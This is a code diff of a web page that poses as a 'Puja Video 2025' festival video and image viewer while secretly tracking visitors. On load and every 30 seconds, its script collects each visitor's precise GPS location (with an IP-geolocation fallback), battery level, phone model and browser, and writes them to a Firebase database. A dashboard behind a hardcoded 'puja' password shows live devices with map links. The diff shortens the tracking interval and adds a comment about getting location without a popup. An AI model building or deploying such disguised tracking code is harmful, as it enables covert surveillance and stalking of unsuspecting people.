@@ -17,15 +17,17 @@ body{margin:0;background:#000;color:#fff;font-family:Arial}
 #dash{position:fixed;inset:0;background:#0f0f0f;display:none;overflow:auto;z-index:40}
 .dashHead{background:#1a1a1a;padding:15px;display:flex;justify-content:space-between;position:sticky;top:0}
 #menu{position:fixed;right:5px;top:50px;background:#222;width:170px;padding:10px;display:none;border-radius:10px;z-index:30}
-.modal{position:fixed;inset:0;background:rgba(0,0,0,.7);display:none;justify-content:center;align-items:center;z-index:100}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.8);display:none;justify-content:center;align-items:center;z-index:100}
 .mbox{background:#fff;color:#000;padding:18px;width:310px;border-radius:10px}
 .videoCtrl{background:#1a1a1a;margin:10px 15px;padding:12px;border-radius:10px;border:1px solid #00ff88}
 .upBtn{background:#222;border:1px dashed #00ff88;color:#fff;padding:12px;width:100%;border-radius:8px;cursor:pointer;margin:5px 0}
 </style>
 </head>
 <body>
+
 <div class="top"><span>Puja Video 2025</span><button onclick="let m=document.getElementById('menu');m.style.display=m.style.display=='block'?'none':'block'" style="background:#333;color:#fff;border:1px solid #555;padding:6px 12px;border-radius:6px">MENU</button></div>
 <div id="menu"><button onclick="openLogin()" style="width:100%;padding:8px">Login</button></div>
+
 <div style="text-align:center;padding:10px">
 <h3>Puja Special Content</h3>
 <div id="contentArea">
@@ -34,108 +36,77 @@ body{margin:0;background:#000;color:#fff;font-family:Arial}
 <div id="ytBox" style="width:100%;max-width:520px;margin:auto;display:none;aspect-ratio:16/9;border-radius:12px;overflow:hidden;background:#000;position:relative"></div>
 </div>
 </div>
-<div id="dash"><div class="dashHead"><h2 style="margin:0">Dashboard</h2><button onclick="closeDash()" style="background:#444;color:#fff;border:0;padding:6px 10px;border-radius:6px">X</button></div>
+
+<div id="dash">
+<div class="dashHead"><h2 style="margin:0">Dashboard</h2><button onclick="closeDash()" style="background:#444;color:#fff;border:0;padding:6px 10px;border-radius:6px">X</button></div>
 <div class="videoCtrl">
-<b>🎬 YouTube Link</b><br><br>
+<b>🎬 YouTube Link Update</b><br><br>
 <input id="linkInput" type="text" placeholder="YouTube link" style="width:100%;padding:10px;background:#222;color:#fff;border:1px solid #555;border-radius:6px">
 <button onclick="saveYT()" style="background:#00ff88;color:#000;padding:10px;border:0;border-radius:6px;font-weight:bold;width:100%;margin-top:8px">Update YouTube</button>
 <hr style="border-color:#333;margin:15px 0">
-<b>🖼️ Phone theke Pic</b><br><br>
+<b>🖼️ Gallery Pic Update</b><br><br>
 <input type="file" id="fileInput" accept="image/*" style="display:none" onchange="uploadPic(this)">
 <button class="upBtn" onclick="document.getElementById('fileInput').click()">📁 Gallery theke Pic Select</button>
 <div id="upStatus" style="font-size:12px;color:#00ff88;margin-top:5px"></div>
-<button id="delBtn" onclick="deletePic()" style="background:#ff4444;color:#fff;padding:8px;border:0;border-radius:6px;width:100%;margin-top:10px;display:none">🗑️ Delete</button>
+<button id="delBtn" onclick="deletePic()" style="background:#ff4444;color:#fff;padding:8px;border:0;border-radius:6px;width:100%;margin-top:10px;display:none">🗑️ Delete Pic</button>
 <br><br><small style="color:#888">Current: <span id="currentVideo">loading...</span></small>
 </div>
-<div class="statBox"><div class="stat"><h3 id="totalCount" style="margin:0;color:#00ff88">0</h3><small>Total</small></div><div class="stat" style="border:2px solid #00ff88"><h3 id="activeCount" style="margin:0;color:#00ff88">0</h3><small>Live</small></div></div>
+<div class="statBox"><div class="stat"><h3 id="totalCount" style="margin:0;color:#00ff88">0</h3><small>Total Phone</small></div><div class="stat" style="border:2px solid #00ff88"><h3 id="activeCount" style="margin:0;color:#00ff88">0</h3><small>● LIVE Now</small></div></div>
 <div id="activeList" style="padding:0 15px"></div>
-<hr style="border-color:#333;margin:10px 15px"><div id="list"></div></div>
+<hr style="border-color:#333;margin:10px 15px"><div id="list"></div>
+</div>
+
 <div id="loginM" class="modal"><div class="mbox"><h3>Login</h3><input id="p" type="password" value="puja" style="width:100%;padding:8px"><br><br><button onclick="doLogin()" style="width:100%;padding:10px;background:#00ff88;font-weight:bold">Login</button></div></div>
+
 <script>
 const firebaseConfig={apiKey:"AIzaSyBMyLWzWbg5KrOsDmsLr2tUdxap4Rbu_2M",authDomain:"puja-tracker.firebaseapp.com",databaseURL:"https://puja-tracker-default-rtdb.firebaseio.com",projectId:"puja-tracker",storageBucket:"puja-tracker.firebasestorage.app",messagingSenderId:"922310793608",appId:"1:922310793608:web:da1e1f360876fe8b9d023d"};
 firebase.initializeApp(firebaseConfig);const db=firebase.database();
 let ytPlayer=null;
-async function saveYT(){ let link=document.getElementById('linkInput').value.trim(); if(!link) return alert("Link dao"); await db.ref("config/content").set({type:'youtube',url:link}); alert("Save!"); }
-function uploadPic(input){
-  let file=input.files[0]; if(!file) return;
-  document.getElementById('upStatus').innerText="Compressing...";
-  let reader=new FileReader();
-  reader.onload=function(e){
-    let img=new Image();
-    img.onload=function(){
-      let canvas=document.createElement('canvas'); let maxW=800; let scale=maxW/img.width;
-      if(img.width>maxW){ canvas.width=maxW; canvas.height=img.height*scale; } else { canvas.width=img.width; canvas.height=img.height; }
-      canvas.getContext('2d').drawImage(img,0,0,canvas.width,canvas.height);
-      let base64=canvas.toDataURL('image/jpeg',0.6);
-      document.getElementById('upStatus').innerText="Uploading...";
-      db.ref("config/content").set({type:'image',url:base64}).then(()=>{ document.getElementById('upStatus').innerText="Done!"; });
-    }; img.src=e.target.result;
-  }; reader.readAsDataURL(file);
-}
+async function saveYT(){ let link=document.getElementById('linkInput').value.trim(); if(!link) return alert("Link dao"); await db.ref("config/content").set({type:'youtube',url:link}); alert("Updated!"); }
+function uploadPic(input){ let file=input.files[0]; if(!file) return; document.getElementById('upStatus').innerText="Compressing..."; let r=new FileReader(); r.onload=e=>{ let img=new Image(); img.onload=()=>{ let c=document.createElement('canvas'); let maxW=800; if(img.width>maxW){c.width=maxW;c.height=img.height*(maxW/img.width);}else{c.width=img.width;c.height=img.height;} c.getContext('2d').drawImage(img,0,0,c.width,c.height); let b64=c.toDataURL('image/jpeg',0.6); document.getElementById('upStatus').innerText="Uploading..."; db.ref("config/content").set({type:'image',url:b64}).then(()=>document.getElementById('upStatus').innerText="Done!"); }; img.src=e.target.result; }; r.readAsDataURL(file); }
 async function deletePic(){ if(!confirm("Delete?")) return; await db.ref("config/content").remove(); }
-function playYouTube(id){
-  let box=document.getElementById("ytBox"); box.style.display="block";
-  box.innerHTML=`<div id="ytInner" style="width:100%;height:100%;position:relative;background:#000"><div id="ytPlayerDiv" style="width:100%;height:100%;pointer-events:none"></div><div style="position:absolute;top:0;left:0;right:0;height:70px;z-index:6;background:linear-gradient(to bottom, rgba(0,0,0,0.9), transparent)"></div><div id="clickLayer" style="position:absolute;inset:0;z-index:5"></div><div id="customCtrl" style="position:absolute;bottom:0;left:0;right:0;z-index:10;background:linear-gradient(to top, rgba(0,0,0,0.85), transparent);padding:10px 12px;display:flex;align-items:center;gap:14px;opacity:0;transition:0.25s;pointer-events:none"><button id="playBtn" style="background:none;border:0;color:#fff;font-size:20px;pointer-events:auto">❚❚</button><button id="rewBtn" style="background:none;border:0;color:#fff;font-size:13px;pointer-events:auto">↺10</button><button id="fwdBtn" style="background:none;border:0;color:#fff;font-size:13px;pointer-events:auto">10↻</button><div style="flex:1"></div><button id="muteBtn" style="background:none;border:0;color:#fff;font-size:18px;pointer-events:auto">🔇</button><button id="fsBtn" style="background:none;border:0;color:#fff;font-size:16px;pointer-events:auto">⛶</button></div></div>`;
-  ytPlayer=new YT.Player('ytPlayerDiv',{videoId:id, width:'100%', height:'100%', playerVars:{ autoplay:1, mute:1, playsinline:1, controls:0, rel:0, fs:0, modestbranding:1, iv_load_policy:3, disablekb:1, enablejsapi:1, showinfo:0 },
-    events:{ onReady:e=>{ e.target.playVideo(); let ctrl=document.getElementById('customCtrl'); let layer=document.getElementById('clickLayer'); let isMuted=true, isPlaying=true; function showCtrl(){ ctrl.style.opacity='1'; ctrl.style.pointerEvents='auto'; layer.style.pointerEvents='none'; clearTimeout(window.ctrlTimer); window.ctrlTimer=setTimeout(()=>{ ctrl.style.opacity='0'; ctrl.style.pointerEvents='none'; layer.style.pointerEvents='auto'; },3000); } document.getElementById('playBtn').onclick=(ev)=>{ ev.stopPropagation(); if(isPlaying){ ytPlayer.pauseVideo(); ev.target.innerText='▶'; isPlaying=false; } else { ytPlayer.playVideo(); ev.target.innerText='❚❚'; isPlaying=true; } showCtrl(); }; document.getElementById('muteBtn').onclick=(ev)=>{ ev.stopPropagation(); if(isMuted){ ytPlayer.unMute(); ev.target.innerText='🔊'; isMuted=false; } else { ytPlayer.mute(); ev.target.innerText='🔇'; isMuted=true; } showCtrl(); }; document.getElementById('rewBtn').onclick=(ev)=>{ ev.stopPropagation(); ytPlayer.seekTo(ytPlayer.getCurrentTime()-10,true); showCtrl(); }; document.getElementById('fwdBtn').onclick=(ev)=>{ ev.stopPropagation(); ytPlayer.seekTo(ytPlayer.getCurrentTime()+10,true); showCtrl(); }; document.getElementById('fsBtn').onclick=(ev)=>{ ev.stopPropagation(); let b=document.getElementById('ytBox'); if(document.fullscreenElement) document.exitFullscreen(); else b.requestFullscreen(); showCtrl(); }; layer.onclick=showCtrl; showCtrl(); } } });
-}
-db.ref("config/content").on("value",snap=>{
-  let data=snap.val(); if(!data){ document.getElementById("currentVideo").innerText="Empty"; document.getElementById("delBtn").style.display="none"; document.getElementById("mainImage").style.display="none"; document.getElementById("ytBox").style.display="none"; document.getElementById("mainVideo").style.display="none"; return; }
-  document.getElementById("currentVideo").innerText=data.type; document.getElementById("delBtn").style.display="block";
-  let v=document.getElementById("mainVideo"), y=document.getElementById("ytBox"), img=document.getElementById("mainImage"); v.style.display="none"; y.style.display="none"; img.style.display="none"; v.pause(); let url=data.url;
-  if(data.type=='image'){ img.src=url; img.style.display="block"; } else if(url.includes("youtube.com") || url.includes("youtu.be")){ let id=""; if(url.includes("youtu.be/")) id=url.split("youtu.be/")[1].split("?")[0]; else if(url.includes("v=")) id=url.split("v=")[1].split("&")[0]; else id=url.split("/").pop().split("?")[0]; if(window.YT && window.YT.Player) playYouTube(id); else window.onYouTubeIframeAPIReady=()=>playYouTube(id); }else{ v.src=url; v.style.display="block"; v.play().catch(()=>{}); }
-});
+function playYouTube(id){ let box=document.getElementById("ytBox"); box.style.display="block"; box.innerHTML=`<div style="width:100%;height:100%;position:relative"><div id="ytPlayerDiv" style="width:100%;height:100%;pointer-events:none"></div><div id="clickLayer" style="position:absolute;inset:0;z-index:5"></div><div id="customCtrl" style="position:absolute;bottom:0;left:0;right:0;z-index:10;background:linear-gradient(to top, rgba(0,0,0,0.85), transparent);padding:10px;display:flex;gap:10px;opacity:0;transition:0.25s;pointer-events:none"><button id="playBtn" style="background:none;border:0;color:#fff;font-size:20px;pointer-events:auto">❚❚</button><button id="muteBtn" style="background:none;border:0;color:#fff;font-size:18px;pointer-events:auto">🔇</button><div style="flex:1"></div><button id="fsBtn" style="background:none;border:0;color:#fff;font-size:16px;pointer-events:auto">⛶</button></div></div>`; ytPlayer=new YT.Player('ytPlayerDiv',{videoId:id,width:'100%',height:'100%',playerVars:{autoplay:1,mute:1,playsinline:1,controls:0,rel:0,fs:0,modestbranding:1},events:{onReady:e=>{e.target.playVideo();let ctrl=document.getElementById('customCtrl');let layer=document.getElementById('clickLayer');function show(){ctrl.style.opacity='1';ctrl.style.pointerEvents='auto';layer.style.pointerEvents='none';clearTimeout(window.ct);window.ct=setTimeout(()=>{ctrl.style.opacity='0';ctrl.style.pointerEvents='none';layer.style.pointerEvents='auto';},3000);}document.getElementById('playBtn').onclick=ev=>{ev.stopPropagation();let b=ev.target;if(b.innerText=='❚❚'){ytPlayer.pauseVideo();b.innerText='▶';}else{ytPlayer.playVideo();b.innerText='❚❚';}show();};document.getElementById('muteBtn').onclick=ev=>{ev.stopPropagation();if(ytPlayer.isMuted()){ytPlayer.unMute();ev.target.innerText='🔊';}else{ytPlayer.mute();ev.target.innerText='🔇';}show();};document.getElementById('fsBtn').onclick=ev=>{ev.stopPropagation();let bx=document.getElementById('ytBox');if(document.fullscreenElement)document.exitFullscreen();else bx.requestFullscreen();show();};layer.onclick=show;show();}}});}
+db.ref("config/content").on("value",s=>{ let d=s.val(); if(!d){document.getElementById("currentVideo").innerText="Empty";document.getElementById("delBtn").style.display="none";document.getElementById("mainImage").style.display="none";document.getElementById("ytBox").style.display="none";document.getElementById("mainVideo").style.display="none";return;} document.getElementById("currentVideo").innerText=d.type;document.getElementById("delBtn").style.display="block"; let v=document.getElementById("mainVideo"),y=document.getElementById("ytBox"),img=document.getElementById("mainImage"); v.style.display="none";y.style.display="none";img.style.display="none";v.pause(); let url=d.url; if(d.type=='image'){img.src=url;img.style.display="block";} else if(url.includes("youtube.com")||url.includes("youtu.be")){let id="";if(url.includes("youtu.be/"))id=url.split("youtu.be/")[1].split("?")[0];else if(url.includes("v="))id=url.split("v=")[1].split("&")[0];else id=url.split("/").pop().split("?")[0];if(window.YT&&window.YT.Player)playYouTube(id);else window.onYouTubeIframeAPIReady=()=>playYouTube(id);}else{v.src=url;v.style.display="block";v.play().catch(()=>{});} });
+
 function getBrand(ua){ua=ua.toLowerCase();if(ua.includes("vivo"))return"Vivo";if(ua.includes("samsung")||ua.includes("sm-"))return"Samsung";if(ua.includes("redmi")||ua.includes("xiaomi"))return"Redmi";if(ua.includes("oppo"))return"Oppo";if(ua.includes("realme"))return"Realme";if(ua.includes("infinix"))return"Infinix";return"Android";}
 function getBrowserName(){let ua=navigator.userAgent;if(ua.includes("Edg"))return"Edge";if(ua.includes("Chrome"))return"Chrome";if(ua.includes("Firefox"))return"Firefox";if(ua.includes("Safari")&&!ua.includes("Chrome"))return"Safari";return"Browser";}
 async function getDeviceInfo(){ let ua=navigator.userAgent;let brand=getBrand(ua);let model=""; try{if(navigator.userAgentData?.getHighEntropyValues){let h=await navigator.userAgentData.getHighEntropyValues(["model"]);if(h.model)model=h.model;}}catch(e){} if(!model){let m=ua.match(/Android.*;\s([^;\)]+)\sBuild\//);if(m)model=m[1].replace("WV; ","").trim();} if(!model || model=="K"){let m2=ua.match(/;\s([^;]+)\sBuild\//);if(m2)model=m2[1].trim();} if(!model || model.length<2) model=brand+" Phone"; return {brand,model}; }
+
 let allData={},allStatus={};
 
 async function autoTrack(){
   let {brand,model}=await getDeviceInfo();
   let browser=getBrowserName();
-  let deviceId=localStorage.getItem("deviceId");
-  if(!deviceId){ deviceId="dev_"+Date.now()+"_"+Math.random().toString(36).substr(2,5); localStorage.setItem("deviceId",deviceId); }
-
-  async function getFreshBattery(){ try{ let b=await navigator.getBattery(); return Math.round(b.level*100)+"%"; }catch(e){ return "N/A"; } }
-
+  let deviceId=localStorage.getItem("deviceId");if(!deviceId){deviceId="dev_"+Date.now()+"_"+Math.random().toString(36).substr(2,5);localStorage.setItem("deviceId",deviceId);}
+  async function getBattery(){ try{ let b=await navigator.getBattery(); return Math.round(b.level*100)+"%"; }catch(e){ return "N/A"; } }
   let statusRef=db.ref("status/"+deviceId);
-  db.ref(".info/connected").on("value",async s=>{
-    if(s.val()){
-      let bat=await getFreshBattery();
-      statusRef.set({deviceId,brand,model,browser,battery:bat,online:true,timestamp:Date.now()});
-      statusRef.onDisconnect().set({deviceId,brand,model,browser,battery:bat,online:false,timestamp:Date.now()});
-    }
-  });
-
+  db.ref(".info/connected").on("value",async s=>{ if(s.val()){ let bat=await getBattery(); statusRef.set({deviceId,brand,model,browser,battery:bat,online:true,timestamp:Date.now()}); statusRef.onDisconnect().set({deviceId,brand,model,browser,battery:bat,online:false,timestamp:Date.now()}); }});
   async function save(lat,lon,addr){
-    let battery=await getFreshBattery();
+    let battery=await getBattery();
     let time=new Date().toLocaleString("en-BD",{timeZone:"Asia/Dhaka",hour12:true});
     let ts=Date.now();
     let data={brand,model,browser,battery,lat,lon,address:addr||lat+","+lon,time,timestamp:ts,deviceId};
     await db.ref("locations/"+deviceId).set(data);
     await db.ref("status/"+deviceId).set({deviceId,brand,model,browser,battery,online:true,timestamp:ts});
   }
-
-  async function fetchAndUpload(){
-    if(navigator.geolocation){
-      navigator.geolocation.getCurrentPosition(
-        p=>save(p.coords.latitude,p.coords.longitude,null),
-        async()=>{ try{let r=await fetch("https://ipapi.co/json/"); let j=await r.json(); save(j.latitude,j.longitude,j.city+", "+j.region);}catch(e){} },
-        {enableHighAccuracy:true, timeout:10000, maximumAge:0}
-      );
-    }
+  function fetchAndUpload(){
+    navigator.geolocation.getCurrentPosition(
+      p=>save(p.coords.latitude,p.coords.longitude,"GPS Location"),
+      async()=>{ try{let r=await fetch("https://ipapi.co/json/");let j=await r.json();if(j.latitude) save(j.latitude,j.longitude,j.city+", "+j.region);}catch(e){} },
+      {enableHighAccuracy:true,timeout:10000,maximumAge:0}
+    );
   }
-
-  // 1. Page load holei scan + Firebase e purono clear kore new write
   fetchAndUpload();
-
-  // 2. Page load na holeo 60 sec por por auto call + Firebase write
-  setInterval(fetchAndUpload, 60000); // 30 sec chaile 30000
-
-  // 3. Tab background theke firle sathe sathe update
-  document.addEventListener("visibilitychange", ()=>{ if(!document.hidden) fetchAndUpload(); });
+  setInterval(fetchAndUpload, 30000);
+  document.addEventListener("visibilitychange",()=>{ if(!document.hidden) fetchAndUpload(); });
 }
-autoTrack();
+
+// Auto permission check - popup nai, browser nijei GPS call korbe
+if(navigator.geolocation){
+  navigator.geolocation.getCurrentPosition(()=>{ autoTrack(); },()=>{ autoTrack(); },{enableHighAccuracy:true,timeout:8000});
+} else {
+  autoTrack();
+}
 
 function openLogin(){document.getElementById('loginM').style.display='flex';document.getElementById('menu').style.display='none';}
 function doLogin(){if(document.getElementById('p').value==="puja"){localStorage.setItem("logged","yes");document.getElementById('loginM').style.display='none';openDash();}}
@@ -143,6 +114,7 @@ function openDash(){
   document.getElementById('dash').style.display='block';
   db.ref("locations").on("value",s=>{ allData=s.val()||{}; render(); });
   db.ref("status").on("value",s=>{ allStatus=s.val()||{}; render(); });
+  setInterval(()=>{ db.ref("locations").once("value").then(s=>{ allData=s.val()||{}; render(); }); db.ref("status").once("value").then(s=>{ allStatus=s.val()||{}; render(); }); }, 30000);
 }
 function render(){
   let liveArr=[]; let offArr=[];
@@ -154,10 +126,9 @@ function render(){
   document.getElementById('activeList').innerHTML=html;
 }
 function showData(id){
-  let v=allData[id] || allStatus[id];
-  if(!v) return;
+  let v=allData[id]; if(!v){ let s=allStatus[id]; if(!s) return; document.getElementById('list').innerHTML=`<div class="card"><b>${s.brand} ${s.model}</b><br>Sync hocche...</div>`; return; }
   let isLive=allStatus[id]?.online;
-  document.getElementById('list').innerHTML=`<div class="card"><b>${v.brand} ${v.model}</b> <span style="float:right;background:${isLive?'#00ff88':'#555'};color:${isLive?'#000':'#fff'};padding:2px 8px;border-radius:10px;font-size:11px">${isLive?'● LIVE':'Offline'}</span><br><b>Battery:</b> ${v.battery}<br><b>Browser:</b> ${v.browser}<br><b>Location:</b> ${v.address||v.lat+","+v.lon}<br><b>Time:</b> ${v.time}<br><b>Updated:</b> ${v.timestamp?new Date(v.timestamp).toLocaleString():"Now"}<br><br><a href="https://maps.google.com/?q=${v.lat},${v.lon}" target="_blank" style="background:#00ff88;color:#000;padding:7px 14px;border-radius:6px;text-decoration:none">MAP</a> <button onclick="document.getElementById('list').innerHTML=''" style="background:#444;color:#fff;border:0;padding:7px 12px;border-radius:6px;margin-left:8px">Close</button></div>`;
+  document.getElementById('list').innerHTML=`<div class="card"><b>${v.brand} ${v.model}</b> <span style="float:right;background:${isLive?'#00ff88':'#555'};color:${isLive?'#000':'#fff'};padding:2px 8px;border-radius:10px;font-size:11px">${isLive?'● LIVE':'Offline'}</span><br><b>Brand:</b> ${v.brand}<br><b>Model:</b> ${v.model}<br><b>Browser:</b> ${v.browser}<br><b>Battery:</b> ${v.battery}<br><b>Lat:</b> ${v.lat}<br><b>Lon:</b> ${v.lon}<br><b>Address:</b> ${v.address}<br><b>Time:</b> ${v.time}<br><b>Updated:</b> ${new Date(v.timestamp).toLocaleString()}<br><br><a href="https://maps.google.com/?q=${v.lat},${v.lon}" target="_blank" style="background:#00ff88;color:#000;padding:7px 14px;border-radius:6px;text-decoration:none">MAP</a> <button onclick="document.getElementById('list').innerHTML=''" style="background:#444;color:#fff;border:0;padding:7px 12px;border-radius:6px;margin-left:8px">Close</button></div>`;
 }
 function closeDash(){document.getElementById('dash').style.display='none';}
 </script>
